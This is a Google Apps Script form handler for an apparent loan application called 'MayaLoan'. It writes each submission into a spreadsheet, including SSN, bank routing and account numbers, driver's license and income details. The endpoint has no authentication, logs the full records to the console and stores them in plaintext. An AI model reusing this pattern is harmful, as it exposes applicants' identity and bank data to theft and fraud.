function doPost(e) {
  try {
    // Parse the incoming data
    const data = JSON.parse(e.postData.contents);
    
    // Get the active spreadsheet
    const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
    
    // Log the incoming data for debugging
    console.log('Received form data:', data);
    
    // Prepare the row data with all form fields plus metadata
    const row = [
      new Date(), // Timestamp
      data.loanAmount || '',
      data.creditScore || '',
      data.title || '',
      data.firstName || '',
      data.lastName || '',
      data.birthDate || '',
      data.zipCode || '',
      data.address || '',
      data.city || '',
      data.residenceTime || '',
      data.residenceType || '',
      data.incomeSource || '',
      data.employmentTime || '',
      data.payFrequency || '',
      data.monthlyIncome || '',
      data.nextPayDate || '',
      data.employer || '',
      data.jobTitle || '',
      data.employerPhone || '',
      data.paycheckMethod || '',
      data.routingNumber || '',
      data.bankName || '',
      data.accountType || '',
      data.accountLength || '',
      data.accountNumber || '',
      data.driversLicense || '',
      data.licenseState || '',
      data.ssn || '',
      data.email || '',
      data.phone || '',
      data.creditTrial || '',
      data.submissionDate || '',
      data.userAgent || '',
      data.timestamp || ''
    ];
    
    // Append the row to the spreadsheet
    sheet.appendRow(row);
    
    // Log successful submission
    console.log('Successfully added row to spreadsheet');
    
    // Return success response
    return ContentService
      .createTextOutput(JSON.stringify({ 
        'result': 'success', 
        'message': 'Form submitted successfully',
        'row': row.length 
      }))
      .setMimeType(ContentService.MimeType.JSON);
      
  } catch (error) {
    // Log the error
    console.error('Error processing form submission:', error);
    
    // Return error response
    return ContentService
      .createTextOutput(JSON.stringify({ 
        'result': 'error', 
        'error': error.toString(),
        'message': 'Failed to process form submission'
      }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function doGet(e) {
  return ContentService
    .createTextOutput('MayaLoan Form Handler is running!')
    .setMimeType(ContentService.MimeType.TEXT);
}

// Function to set up headers in the spreadsheet
function setupHeaders() {
  const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
  
  const headers = [
    'Timestamp',
    'Loan Amount',
    'Credit Score',
    'Title',
    'First Name',
    'Last Name',
    'Birth Date',
    'Zip Code',
    'Address',
    'City',
    'Residence Time',
    'Residence Type',
    'Income Source',
    'Employment Time',
    'Pay Frequency',
    'Monthly Income',
    'Next Pay Date',
    'Employer',
    'Job Title',
    'Employer Phone',
    'Paycheck Method',
    'Routing Number',
    'Bank Name',
    'Account Type',
    'Account Length',
    'Account Number',
    'Driver License',
    'License State',
    'SSN',
    'Email',
    'Phone',
    'Credit Trial',
    'Submission Date',
    'User Agent',
    'Timestamp (Unix)'
  ];
  
  // Set headers in the first row
  sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
  
  // Format headers
  sheet.getRange(1, 1, 1, headers.length).setFontWeight('bold');
  sheet.getRange(1, 1, 1, headers.length).setBackground('#2a7151');
  sheet.getRange(1, 1, 1, headers.length).setFontColor('white');
  
  // Auto-resize columns
  sheet.autoResizeColumns(1, headers.length);
  
  console.log('Headers set up successfully');
} 